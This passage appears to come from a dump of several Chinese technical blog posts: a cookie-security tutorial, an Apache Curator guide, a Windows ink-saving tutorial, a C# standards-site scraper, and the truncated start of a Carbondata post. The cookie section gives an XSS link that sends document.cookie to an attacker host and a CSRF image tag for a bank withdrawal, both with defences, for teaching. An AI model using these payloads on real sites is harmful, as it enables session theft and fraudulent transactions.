user=\"wang\"\n\n \nsecure\n设置了属性secure，cookie只有在https协议加密情况下才会发送给服务端。但是这并不是最安全的，由于其固有的不安全性，敏感信息也是不应该通过cookie传输的.\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure;\n\n\nchrome 52和firefox 52 开始不安全的（HTTP）是无法使用secure的：\n\n操作Cookie\n通过docuemnt.cookie可以设置和获取Cookie的值\n\ndocument.cookie = \"user=wang\";\nconsole.log(document.cookie);\n\n\n禁止javascript操作cookie（为避免跨域脚本(xss)攻击，通过javascript的document.cookie无法访问带有HttpOnly标记的cookie。）\n\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2017 07:28:00 GMT; Secure; HttpOnly\n\n第三方cookie\n通常cookie的域和浏览器地址的域匹配，这被称为第一方cookie。那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。\n\n如上图（a）：用户访问服务器1的一个页面index.html，这个页面和第三方广告网站合作，这个页面还有一张www.advertisement.com域名下的一张广告图ad1.jpg，当请求这张ad1.jpg图片的时候，www.advertisement.com这个服务器会给用户设置cookie\n\nSet-Cookie: user=\"wang\";like=\"a\"; domain=\"advertisement.com\"\n\n记录用户的浏览记录，分配一个user来表示用户的身份。\n图（b）：用户访问服务器2的一个index.html页面，这个页面也和同一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad2.jpg，当请求这张ad2.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie\n\nCookie:  user=\"wang\"; like=\"a\";\n\nwww.advertisement.com收到浏览器发送的cookie识别了用户的身份，同时又把这个页面用户的浏览数据设置cookie\n\nSet-Cookie: buy=\"b\"; domain=\"advertisement.com\"\n\n图（c）：很巧，用户访问服务器3的一个index.html页面，这个页面也和那一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad3.jpg，当请求这张ad3.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie\n\nCookie:  user=\"wang\"; like=\"a\"; buy=\"b\"\n\n这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。\n安全\n多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种cookie盗用和会话劫持的例子：\n网络窃听\n网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。\n解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。\nDNS缓存中毒\n如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如：攻击者使用DNS中毒来创建一个虚拟的NDS服务h123456.www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器 h123456.www.demo.com/img_01.png 发布图片。用户访问这个图片，由于 www.demo.com和h123456.www.demo.com是同一个子域，所以浏览器会把用户的与www.demo.com相关的cookie都会发送到h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。\n一般情况下是不会发生这种情况，通常是网络供应商错误。\n跨站点脚本XSS\n使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。\n例子：\n\n<a href=\"#\" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>\n\n当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。\n解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。\n跨站请求伪造CSRF\n例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如，\n\n<img  src = \"http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing\" >\n\n如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。\n解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。\n 如果你喜欢我们的文章，关注我们的公众号和我们互动吧。\n "},{"title":"15. 使用Apache Curator管理ZooKeeper","body":"Apache ZooKeeper是为了帮助解决复杂问题的软件工具，它可以帮助用户从复杂的实现中解救出来。 然而，ZooKeeper只暴露了原语，这取决于用户如何使用这些原语来解决应用程序中的协调问题。 社区已经在ZooKeeper数据模型及其API之上开发了高级框架。 Apache Curator是一个高级的包装类库和框架，使得ZooKeeper非常简单易用。\n\nTips\nCurator最初由Netflix开发，现在是一个Apache项目。 项目页面位于http://curator.apache.org/。\n\n一 Curator组件\nCurator是ZooKeeper的高级类库；它使处理ZooKeeper变得更容易，并扩展了核心ZooKeeper的功能。 Curator在高层次上由以下部分组成：\n\nClient：Curator客户端是ZooKeeper的Java客户端的一个包装器。 它是Curator堆栈中的一个低级API，并且抽象出ZooKeeper客户端的功能。\nFramework：Curator框架是一个具有高级功能的高级API，如自动连接管理，操作重试等等。 它在很大程度上简化了ZooKeeper的使用。\nRecipe：Curator Recipe提供ZooKeeper Recipe的实现； 这些实现可以直接用于分布式应用程序来解决协调问题。\nExtensions：Curator Recipe包实现了常见的Recipe。 为了避免这个包的膨胀，使用一个单独的扩展包。\n\n除了前面的组件外，Curator还附带一些ZooKeeper有用的工具。 Curator堆栈如下图所示：\n\nCurator JARs可以在Maven Central的仓库中找到。 Curator可以很容易地包含在Maven，Gradle，Ivy，SBT等构建脚本中。\n各种Maven artifacts在http://mvnrepository.com/artifact/org.apache.curator上列出。\n二 Curator客户端\nCurator Client是ZooKeeper Java客户端的一个包装器。它使客户端访问ZooKeeper更简单，更不易出错。\nCurator客户端提供以下功能：\n\n连接管理：管理与ZooKeeper服务器的连接\n操作重试实用程序：这是重试操作的机制\n测试ZooKeeper服务器：这是用于测试ZooKeeper服务器\n\n使用Curator客户端连接ZooKeeper服务器的MyCuratorClient.java的代码片段如下：\npublic void myCuratorClient() throws Exception\n{\n  CuratorZookeeperClient client = new CuratorZookeeperClient(server.getConnectString(), 10000, 10000, null,new RetryOneTime(1));\n  client.start();\n  try\n  {\n    client.blockUntilConnectedOrTimedOut();\n    String path = client.getZooKeeper().create(\"/test_znode\", \"\".getBytes(),ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);\n  }\n  finally\n  {\n    client.close();\n  }\n}\nCuratorZooKeeperClient构造方法用于连接到ZooKeeper服务器。 它需要连接字符串或ZooKeeper主机端口对列表，会话和连接超时时间，可选的观察器对象以及要使用的重试策略。 重试策略是客户端在重试连接时尝试各种重试机制的机制。在前面的例子中，使用了一个客户端只会重试一次的策略。\nCurator客户端支持以下重试策略：\n\nBoundedExponentialBackoffRetry：通过增加重试之间的休眠时间直到最大上限重试指定的次数\nExponentialBackoffRetry：通过增加重试之间的休眠时间来重试指定的次数\nRetryNTimes：重试n次\nRetryOneTime：只重试一次\nRetryUntilElapsed：一直重试，直到超过指定时间\n\n一旦客户端启动，blockUntilConnectedOrTimedOut方法直到ZooKeeper连接服务器成功或者连接超时。连接成功之后，创建/testznode的znode。getZooKeeper()方法将连接的实例返回给托管的ZooKeeper服务器。\n\nNote\nCurator API文档可在http://curator.apache.org/apidocs/index.html察看。\n\nCurator客户端是一个低层次的API，它提供了对管理员客户端API的抽象。开发人员应该使用Curator框架，而不是直接在他们的应用程序中使用CuratorZookeeperClient类作为最佳实践。\n三 Curator框架\nCurator框架（org.apache.curator.framework）是一个高层次的API，很大程度上简化了ZooKeeper的使用。 它提供的一些功能如下：\n\n自动连接管理：此功能自动且透明地处理客户端需要重新建立与ZooKeeper服务器的连接和/或重试操作的场景。\n简单而灵活的API：使用一组新式且流畅的接口来应用ZooKeeper原始的API。\nRecipe：这个功能实现了常见的ZooKeeper Recipe。\n\nCuratorFramework使用CuratorFrameworkFactory进行分配。 它提供了工厂方法以及构造器创建实例。CuratorFramework实例完全是线程安全的。在使用CuratorFramework开发应用程序时，开发人员应该为每个ZooKeeper集群创建和共享一个CuratorFramework实例。CuratorFramework使用fluent风格接口。\n以下展示的是ZooKeeper客户端使用CuratorFramework的代码示例：\npublic void myCuratorFrameworkClient()\nthrows Exception\n{\n  CuratorFramework client =\n  CuratorFrameworkFactory.newClient(server.getConnectString(), new RetryOneTime(1));\n  client.start();\n  try\n  {\n    String path = client.create().withMode(\n    CreateMode.PERSISTENT).forPath(\n    \"/test_znode\", \"\".getBytes());\n  }\n  finally\n  {\n    client.close();\n  }\n}\nnewClient()工厂方法创建一个新的客户端实例，默认会话超时和默认连接超时。 它需要一个连接字符串，是ZooKeeper主机-端口对列表和要使用的重试策略。\nCuratorFramework有一个命名空间的概念。 通过这个，可以在使用构造器方法创建CuratorFramework实例时设置命名空间。 当其中一个API被调用时，该框架将该命名空间预加载到所有路径：\nCuratorFrameworkFactory.Builder builder = CuratorFrameworkFactory.builder();\nCuratorFramework client = builder.connectString (server.getConnectString()).namespace(\"MyApp\").retryPolicy(new RetryOneTime(1)).build();\nclient.create().forPath(\"/test_znode\", data);\n在这里，尽管znode的名称被指定为/test_znode，但是创建的实际znode是/MyApp/test_znode。\nCurator框架还提供了一个名为CuratorTempFramework的有限功能框架接口，用于通过不可靠的网络（如WAN）进行临时连接。 在这个框架中，如果会话保持空闲一段时间，ZooKeeper连接将被关闭。\n四 Curator recipe\nCurator为ZooKeeper提供了一系列随时可用的recipe。 Curator实现的recipe的详细列表和描述可以从http://curator.apache.org/curator-recipes/index.html的项目页面中获取。\n在这里，将简略地介绍一下ZooKeeper的recipe：\n\n领导者选举：Curator为领导选举提供了两种算法：领导者锁定（leader latch）和领导者选择（ leader selector）。两种算法在连接到Zookeeper集群的多个竞争者中选择一个“领导者”。\n在领导者锁定中，如果一组n个参与者与竞争领导，则将n个参与者中的一个随机分配为领导，而在领导选择中，按照到达该Zookeeper服务器的请求的顺序来选择领导。 当领导者解除领导时，选择集群中的n个参与者的另一个竞争者。\n锁：Curator实现以下不同类型的分布式锁：\n\n共享重入锁：这种类型的锁提供全局同步的全分布锁。\n共享锁：这是非重入共享重入锁。\n共享重入读/写锁：这是一个可跨JVM使用的重入读/写互斥锁。\n共享信号量：这是一个计数信号量（semaphore），可以跨JVM使用。\n多锁共享：这是用来管理多个锁作为一个单一的实体。 acquire()调用获取所有的锁。 如果呼叫失败，所有获得的路径被释放。 release()调用释放所有托管的锁。\n\n屏障（Barrier）：这是屏障和双重屏障的具体实现。\n计数器：提供了一种机制来管理共享计数器的共享整数。它还给出了分布式原子增量的分布式原子长整型，分布式原子整型和分布式原子值的机制。\n缓存：缓存是通过路径缓存，节点缓存和树缓存recipe实现的，分别保存ZK路径的znode，本地缓存节点和所有本地缓存的子节点的状态变化数据。\n队列：这提供了分布式队列实现。 支持以下不同类型的队列：\n\n分布式队列：这是一个简单的分布式队列，其中放入队列中的条目是在FIFO中排序的。\n分布式ID队列：这是一个分布式队列的版本，允许一些标识符与队列项相关联。\n分布式优先级队列:这是ZooKeeper的分布式优先级队列的实现。在内部，它使用一个分布式队列，其中可以将优先级指定给项目。\n分布式延迟队列：这是使用时间作为优先级的分布式优先级队列的变体。当将条目添加到队列时，会给出一个延迟值。直到超过延迟时间，该项目将被发送给消费者。\n简单的分布式队列：这是ZooKeeper分布式org.apache.zookeeper.recipes.queue.DistributedQueue队列的一部分替代实现。\n\n节点：这提供了一个persistent ephemeral节点的recipe；这是一个ephemeral的节点，即使在连接和会话中断的情况下也会试图保持在ZooKeeper中。\n\n五 Curator实用程序\nCurator类库也为ZooKeeper提供了一些有用的工具。 其中一些如下所示：\n\nTest server：这是一个可用于本地进程ZooKeeper服务器的测试\nTest cluster：这是一个内部运行的用于ZooKeeper服务器ensemble的测试\nZKPaths：提供了各种使用ZooKeeper znode路径的静态方法\nEnsurePath：确保在使用之前创建特定znode路径的实用程序\nBlockingQueueConsumer：一个类似于Java中的BlockingQueue的队列消费者\nReaper：删除没有子节点的路径和没有数据的节点的实用程序\n\n六 Curator扩展\nCurator扩展包除了包含在recipe包中那些外，还包括额外的recipe。 扩展包中的recipe具有curator-x-name的命名约定。\nCurator目前提供以下扩展功能：\n\nService discovery：这是一个使用ZooKeeper作为服务发现机制的系统。\nService discovery server：这是一个使用REST服务进行非Java和遗留程序的Curator服务发现。 它公开RESTful Web服务来注册，删除和查询服务。\nCurator RPC proxy：该模块实现了一个代理，将非Java环境与Curator框架和recipe桥接在一起。 它使用Apache Thrift，使大量的语言和环境使用Curator的功能，并统一ZooKeeper跨语言/环境的用法。\nZKClient bridge：这个扩展是Curator和ZKClient之间的桥梁（https://github.com/sgroschupf/zkclient）。 使用ZKClient编写的应用程序在不改变现有代码的情况下使用Curator类库会非常有用。 ZKClient bridge不作为Curator分发的一部分进行打包。 它可以在它自己的Maven中心存储库中的curator-x-zkclient-bridge中找到。\n\n到目前为止，我们已经了解Curator类库及其各种组件。Curator为ZooKeeper API实现了一个非常好的，可靠的扩展，将ZooKeeper的许多复杂性抽象出来。 强烈建议开发人员使用Curator在Java语言的ZooKeeper开发分布式应用程序。 不仅如此，Curator的强大功能也可以从Java以外的语言编写的应用程序中使用。\n"},{"title":"【Win 10 应用开发】将墨迹保存到图像的两种方法","body":"IT界最近这几年，各种乱七八糟的东西不断出现，其中能用在实际工作与生活中的，大概也就那么几个。Web 前端也冒出各种框架，这就为那些喜欢乱用框架的公司提供了很好的机会，于是造成很多项目体积越来越庞大，越来越难维护。一切变得越来越没有标准，所以，很多公司在招聘码农时就特能乱写，还要求你精通 AA，BB，CC，DD，EE，FF，GG……甚至有的不下二三十项要求。老周觉得这些公司基本上是神经病，先不说世界没有人能精通那么多东西，就算真有人能精通那么多，那估计这个人也活不久了，早晚得累死的。\n实际上，Web 前端你能学会三样东西就够了——HTML、CSS、JS，其他纯属娱乐。\n所以，学习编程的话，你抓几个有代表性地学就好了，比如C/C++，.net，PHP，Java 这些，其余的嘛，现学现用，用完就扔。你要是想让自己变成高手的话，那你就必须挑一个方向，纵向深度发展。什么都学等于什么都不通，学乱七八糟的东西是成不了高手的。就拿黑客这一活儿来说，只有第一代，第二代黑客比较强，后面的基本是菜鸟，一代不如一代。没办法，浮躁的时代，IT业也不可幸免的。\n \n好了，上面的都是P话，下面老周开始说正题，今天咱们谈谈如何将电子墨迹保存到图像。在近年来出现的各种花拳绣腿技术中，电子墨迹还算是有实用价值的东西。还有触控、虚拟化这些，也有一定的用途。人工智障倒是可有可无，可作为辅助，但不太可靠，最起码它代替不了人脑（笨蛋例外），我估计将来搞艺术可能吃香，毕竟机器是不懂艺术的。普工可能会大量失业，因为他们做的事情可以让机器做了（主要是重复性，机械性的工作）。\n拿笔写字是人的本能，千万不要鼠标键盘用多了连笔都拿不动（这已经是“鼠标手”的轻度症状了，不及时治疗，以后会很难看的）。科技再发达，人类的本能绝不能丢，就好比哪天你连穿衣吃饭都不会了，那你活该饿死。\n本文就介绍两种比较简单的方法：\n第一种是运用 win 2D 封装的功能来完成。老周做的那个“练字神器”应用就是用这种方法保存你的书法作品的，其中的宣纸纸纹原理也很简单，就是分层绘制，首先在底层绘制纸张的纹理图案，然后再把墨迹绘制到底纹之上即可。\n第二种不需要借助其他 Nuget 上的库，只要使用 1709 最新的 API 就能实现。\n \n \n先说第一种方案。\n为了演示，老周就做简单一点。下面 XAML 代码在界面上声明了一个 InkCanvas ，用来收集输入的墨迹，然后一个 Button ，点击后选择文件路径，然后保存为 png 图片。\n\n    <Grid Background=\"{ThemeResource ApplicationPageBackgroundThemeBrush}\">\n        <Grid.RowDefinitions>\n            <RowDefinition/>\n            <RowDefinition Height=\"auto\"/>\n        </Grid.RowDefinitions>\n        <InkCanvas Name=\"inkcv\"/>\n        <Button Content=\"保存墨迹\" Click=\"OnClick\"  Grid.Row=\"1\" Margin=\"2,9.5\"/>\n    </Grid>\n\n接着，你要打开 nuget 管理器，向项目添加 Win 2D 的引用。这个老周不多说了，你懂怎么操作的。\n如果你绘制的墨迹图像需要在界面上显示，可以用 CanvasControl 控件，然后处理 Draw 事件，如果不需要在界面上显示，例如这个例子，我们是直接保存为图像文件的，所以不需要在界面上添加 CanvasControl 元素了。\n前面在写 UI Composition 的文章时，老周曾用过 Win 2D 做演示，负责绘制操作的是 CanvasDrawingSession 类，其中，你会发现，它有一个方法叫 DrawInk，对的，我们用的就是它，它可以把我们从用户输入收集到的墨迹绘制下来。它有两个重载，其中一个是指定是否绘制成高对比度模式。\n好，理论上的屁话不多说，我直接上代码，你一看就懂的。\n不过，在页面类的构造函数中，我们得先设置一下书写的参数，比如笔触大小、颜色等。\n\n        public MainPage()\n        {\n            this.InitializeComponent();\n            // 支持笔，手触，鼠标输入\n            inkcv.InkPresenter.InputDeviceTypes = Windows.UI.Core.CoreInputDeviceTypes.Mouse | Windows.UI.Core.CoreInputDeviceTypes.Pen | Windows.UI.Core.CoreInputDeviceTypes.Touch;\n            // 设定笔迹颜色为红色\n            InkDrawingAttributes data = new InkDrawingAttributes();\n            data.Color = Colors.Red;\n            // 笔触大小\n            data.Size = new Size(15d, 15d);\n            // 忽略笔的倾斜识别，毕竟只有新型的笔才有这感应\n            data.IgnoreTilt = true;\n            // 更新参数\n            inkcv.InkPresenter.UpdateDefaultDrawingAttributes(data);\n        }\n\n \n随后就可以处理 Button 的 Click 事件了。\n\n        private async void OnClick(object sender, RoutedEventArgs e)\n        {\n            // 如果没有输入墨迹，那就别浪费 CPU 时间了\n            if(inkcv.InkPresenter.StrokeContainer.GetStrokes().Any() == false)\n            {\n                return;\n            }\n\n            // 选择保存文件\n            FileSavePicker picker = new FileSavePicker();\n            picker.FileTypeChoices.Add(\"PNG 图像\", new string[] { \".png\" });\n            picker.SuggestedFileName = \"sample\";\n            picker.SuggestedStartLocation = PickerLocationId.Desktop;\n            StorageFile file = await picker.PickSaveFileAsync();\n            if (file == null) return;\n\n            // 建一个在内存中用的画板（不显示在 UI 上）\n            // 获取共享的 D2D 设备引用\n            CanvasDevice device = CanvasDevice.GetSharedDevice();\n            // 图像大小与 InkCanvas 控件大小相同\n            float width = (float)inkcv.ActualWidth;\n            float height = (float)inkcv.ActualHeight;\n            // DPI 为 96\n            float dpi = 96f;\n            CanvasRenderTarget drawtarget = new CanvasRenderTarget(device, width, height, dpi);\n            // 开始作画\n            using(var drawSession = drawtarget.CreateDrawingSession())\n            {\n                // 我们上面设置了用的是红笔\n                // 为了生成图片后看得清楚\n                // 把墙刷成白色\n                drawSession.Clear(Colors.White);\n                // 画墨迹\n                drawSession.DrawInk(inkcv.InkPresenter.StrokeContainer.GetStrokes());\n            }\n            // 保存到输出文件\n            await drawtarget.SaveAsync(await file.OpenAsync(FileAccessMode.ReadWrite), CanvasBitmapFileFormat.Png, 1.0f);\n            // 释放资源\n            drawtarget.Dispose();\n        }\n\n \n运行应用后，随便写点啥上去。如下图。\n\n \n 然后点击按钮，保存一下。生成的图片如下图所示。\n\n \n \n 好，第一种方案完结，接下来咱们用第二种方案。\n这是 1709 （秋季创作者更新）的新功能。新的 SDK 中增加了一个 CoreInkPresenterHost 类（位于 Windows.UI.Input.Inking.Core 命名空间），使用这类，你可以不需要 InkCanvas 控件，你可以把墨迹接收图面放到任意的 XAML 元素上。因为该类公开一个 RootVisual 属性，注意它不是指向 XAML 可视化元素，而是 ContainerVisual 对象。这是 UI Composition 中的容器类。\n老周前不久刚写过一堆与 UI Composition 有关的文章，如果你不了解相关内容，可以看老周前面的烂文。通过前面对 UI Composition 的学习，我们知道，可以将可视化对象添加到任意 XAML 可视化元素上。对，这个 CoreInkPresenterHost 类就是运用了这个特点，使得墨迹收集可以脱离 InkCanvas 控件，以后，你爱在哪个元素上收集墨迹都行，比如，你想让用户可以对图像进行涂鸦，你就可以把这个类放到 Image 元素上。\nP话少说，咱们来点干货。下面的例子，其界面和前一个例子相似，只是没有用上 InkCanvas 控件，而只是声明了个 Border 元素。\n\n    <Grid Background=\"{ThemeResource ApplicationPageBackgroundThemeBrush}\">\n        <Grid.RowDefinitions>\n            <RowDefinition/>\n            <RowDefinition Height=\"auto\"/>\n        </Grid.RowDefinitions>\n        <Border Name=\"bd\" Margin=\"3\" BorderThickness=\"1\" BorderBrush=\"Green\"/>\n        <Button Grid.Row=\"1\" Margin=\"4,8\" Content=\"保存墨迹\" Click=\"OnClick\"/>\n    </Grid>\n\n然后切换到代码文件，在页面类的构造函数中，进行一下初始化。初始化的东西挺多，包括用 Compositor 创建用来承载墨迹的容器 Visual ，以及设置笔触参数。\n\n        CoreInkPresenterHost inkHost = null;\n        public MainPage()\n        {\n            this.InitializeComponent();\n\n            // 组装一个 UI，把一个可视化容器放到 Border 上\n            Visual bdvisual = ElementCompositionPreview.GetElementVisual(bd);\n            var compositor = bdvisual.Compositor;\n            // 创建一个容器\n            ContainerVisual inkContainer = compositor.CreateContainerVisual();\n            // 此时因为各元素的宽度和高度都为0，所以用动画来更新容器的大小\n            var expressAnimate = compositor.CreateExpressionAnimation();\n            expressAnimate.Expression = \"bd.Size\";\n            expressAnimate.SetReferenceParameter(\"bd\", bdvisual);\n            inkContainer.StartAnimation(\"Size\", expressAnimate);\n            // 设置容器与 Border 关联\n            ElementCompositionPreview.SetElementChildVisual(bd, inkContainer);\n\n            // 处理墨迹收集关联\n            inkHost = new CoreInkPresenterHost();\n            inkHost.RootVisual = inkContainer;\n            inkHost.InkPresenter.InputDeviceTypes = Windows.UI.Core.CoreInputDeviceTypes.Mouse | Windows.UI.Core.CoreInputDeviceTypes.Pen | Windows.UI.Core.CoreInputDeviceTypes.Touch;\n            // 设置笔触参数\n            InkDrawingAttributes attrib = new InkDrawingAttributes();\n            attrib.Color = Colors.SkyBlue;\n            attrib.Size = new Size(15f, 15f);\n            attrib.IgnoreTilt = true;\n            // 更新参数\n            inkHost.InkPresenter.UpdateDefaultDrawingAttributes(attrib);\n        }\n\n创建了容器 Visual 后，记得要通过 CoreInkPresenterHost 对象的 RootVisual 属性来关联。当然你不能忘了把这个 visual 加到 Border 的子元素序列上。\n现在处理 Click 事件，用 RenderTargetBitmap 类，把 Border 的内容画出来，这样会连同它上面的墨迹也一起画出来。\n\n            // 这个类可以绘制 XAML 元素，以前介绍过\n            RenderTargetBitmap rtarget = new RenderTargetBitmap();\n            await rtarget.RenderAsync(bd);\n\n然后用图像编码器写入文件就行了。\n\n            // 获取像素数据\n            var pxBuffer = await rtarget.GetPixelsAsync();\n            // 开始为图像编码\n            using(var stream = await outFile.OpenAsync(FileAccessMode.ReadWrite))\n            {\n                BitmapEncoder encoder = await BitmapEncoder.CreateAsync(BitmapEncoder.PngEncoderId, stream);\n                encoder.SetPixelData(BitmapPixelFormat.Bgra8, BitmapAlphaMode.Premultiplied, (uint)rtarget.PixelWidth, (uint)rtarget.PixelHeight, 96d, 96d, pxBuffer.ToArray());\n                await encoder.FlushAsync();\n            }\n\n \n完整的事件处理代码如下。\n\n        private async void OnClick(object sender, RoutedEventArgs e)\n        {\n            if (inkHost.InkPresenter.StrokeContainer.GetStrokes().Any() == false)\n                return;\n\n            FileSavePicker picker = new FileSavePicker();\n            picker.FileTypeChoices.Add(\"PNG 图像文件\", new string[] { \".png\" });\n            picker.SuggestedFileName = \"sample\";\n\n            StorageFile outFile = await picker.PickSaveFileAsync();\n            if (outFile == null)\n                return;\n\n            // 这个类可以绘制 XAML 元素，以前介绍过\n            RenderTargetBitmap rtarget = new RenderTargetBitmap();\n            await rtarget.RenderAsync(bd);\n            // 获取像素数据\n            var pxBuffer = await rtarget.GetPixelsAsync();\n            // 开始为图像编码\n            using(var stream = await outFile.OpenAsync(FileAccessMode.ReadWrite))\n            {\n                BitmapEncoder encoder = await BitmapEncoder.CreateAsync(BitmapEncoder.PngEncoderId, stream);\n                encoder.SetPixelData(BitmapPixelFormat.Bgra8, BitmapAlphaMode.Premultiplied, (uint)rtarget.PixelWidth, (uint)rtarget.PixelHeight, 96d, 96d, pxBuffer.ToArray());\n                await encoder.FlushAsync();\n            }\n        }\n\n \n好，完事了，现在运行一下，直接中 Border 元素上写点东东。\n\n \n然后点击底部的按钮保存为图片，如下图所示。\n\n \n \nOK，本文就扯到这里了，开饭，不然饭菜凉了。\n "},{"title":"C#爬虫系列（一）——国家标准全文公开系统","body":"网上有很多Python爬虫的帖子，不排除很多培训班借着AI的概念教Python，然后爬网页自然是其中的一个大章节，毕竟做算法分析没有大量的数据怎么成。\nC#相比Python可能笨重了些，但实现简单爬虫也很便捷。网上有不少爬虫工具，通过配置即可实现对某站点内容的抓取，出于定制化的需求以及程序员重复造轮子的习性，我也做了几个标准公开网站的爬虫。\n在学习的过程中，爬网页的难度越来越大，但随着问题的一一攻克，学习到的东西也越来越多，从最初简单的GET，到POST，再到模拟浏览器填写表单、提交表单，数据解析也从最初的字符串处理、正则表达式处理，到HTML解析。一个NB的爬虫需要掌握的知识不少，HTTP请求、响应，HTML DOM解析，正则表达式匹配内容，多线程、数据库存储，甚至有些高级验证码的处理都得AI。\n当然，爬爬公开标准不是那么难，比如国家标准全文公开系统。\n整个过程需要爬以下页面：\n\n列表页\n详细信息页\n文件下载页\n\n需要处理的技术问题有：\n\nHTTP请求\n正则表达式\nHTML解析\nSqlLite数据库存储\n\n一、列表页\n首先查看到标准分GB和GB/T两类，地址分别为：\nhttp://www.gb688.cn/bzgk/gb/std_list_type?p.p1=1&p.p90=circulation_date&p.p91=desc\n和\nhttp://www.gb688.cn/bzgk/gb/std_list_type?p.p1=2&p.p90=circulation_date&p.p91=desc。\n从中可以看出，GET请求的查询字符串参数p1值为1和2分别查询到GB和GB/T。因此，要获取到标准列表，向以上地址发送GET请求即可。\n\nHttpWebRequest httprequst = (HttpWebRequest)WebRequest.Create(Url);\nHttpWebResponse webRes = (HttpWebResponse)httprequst.GetResponse();\n using (System.IO.Stream stream = webRes.GetResponseStream())\n{\n     using (System.IO.StreamReader reader = new StreamReader(stream,         System.Text.Encoding.GetEncoding(\"utf-8\")))\n     {\n         content = reader.ReadToEnd();\n     }\n }\n\n标准共N多页，查看第二页标准列表，地址更改为：\nhttp://www.gb688.cn/bzgk/gb/std_list_type?r=0.7783908698326173&page=2&pageSize=10&p.p1=1&p.p90=circulation_date&p.p91=desc。\n由此可见page参数指定了分页列表的当前页数，据此，循环请求即可获取到所有的标准列表信息。\n\n二、详细信息页\n获取到标准列表后，下一步我需要获取到标准的详细信息页，从详细信息页中抓取更多的标准说明信息，例如标准的发布单位、归口单位等。\n\n查看标准详细页URL，其值为：\nhttp://www.gb688.cn/bzgk/gb/newGbInfo?hcno=9E5467EA1922E8342AF5F180319F34A0。\n可以看出每个标准有个GUID值，在列表页面中点击按钮“查看详细”，转到详细页。实现这个跳转的方式，最简单的是HTML超链接，此外还可以是JS脚本，甚至是POST数据到服务器。不同的链接方式，自然需要不同的抓取方式，因此需要查看列表页源码来分析该站点的实现方式并找到对应的处理方法。\n\n通过分析源码，可以看到在点击标准号时，通过JS的showInfo函数打开详细页面，由于JS方法传递的ID即为详细页面的参数ID，因此没必要去模拟onclick执行JS函数，直接解析到该GUID，GET请求详细页面即可。解析该GUID值，可以通过正则表达式方便的抓取到。\n获取到详细信息页面后，要解析其中的内容，此时使用正则表达式解析就比较费劲了，可以采用HTML解析。C#解析HTML的第三方类库有不少，选择其中一款即可，HtmlAgilityPack或Winista.HtmlParser都是比较好用的。\n三、文件下载页\n解析到标准详细信息后，还需要进一步获取到标准PDF文件，分析详细页面可以看到标准文件下载页面路径为：\nhttp://c.gb688.cn/bzgk/gb/showGb?type=download&hcno=9E5467EA1922E8342AF5F180319F34A0\n\n进一步分析PDF文件的URL为：\nhttp://c.gb688.cn/bzgk/gb/viewGb?hcno=9E5467EA1922E8342AF5F180319F34A0。\n仍然是那个GUID值，因此可以直接GET请求该地址即可下载标准PDF文件。\n至此标准的属性信息和标准PDF文件都可以下载到了，然后需要将这些信息存储起来。存储为SQL Server、Oracle自然比较笨重，即使Excel和Access也不大友好，推荐此类临时存储可以使用SqlLite。\n\n\n string connectionString = @\"Data Source=\" + dbBasePath + \"StandardDB.db;Version=3;\";\nm_dbConnection = new SQLiteConnection(connectionString);\nm_dbConnection.Open();\nSQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);\ncommand.ExecuteNonQuery();\nm_dbConnection.Close();\n\nView Code\n "},{"title":"Carbondata源码系列（二）文件格式详解","body":"在上一章当中，写了文件的生成过程。这一章主要讲解文件格式（V3版本）的具体细节。\n1、字典文件格式详解\n字典文件的作用是在存储的时候将字符串等类型转换为int类型，好处主要有两点：\n1、减少存储占用空间\n2、用在需要group by的字段上比较合适，可以减少计算时的shuffle的数据量。\n每一个字典列都有对应的三种文件.dict, .sortindex, .dictmeta文件，输出格式都是thrift格式\n1.1 .dict文件\n字典的值每满1000就作为一个chunk输出一次，具体的类是ColumnDictionaryChunk\n相关参数：\ncarbon.dictionary.chunk.size\n1.2 .sortindex文件\n把字段的值sort了一下之后，计算出每个值的sortIndex和invertedIndex，具体的类是ColumnSortInfo\n1、List<SortIndex>，记录着每个字典值的surrogate，从1开始\n2、List<SortInvertedIndex>，记录着每个字典surrogate在数组中的位置，从1开始\n它们的关系如下：\n\n      sortIndex[i] = dictionarySortModel.getKey();\n      // the array index starts from 0 therefore -1 is done to avoid wastage\n      // 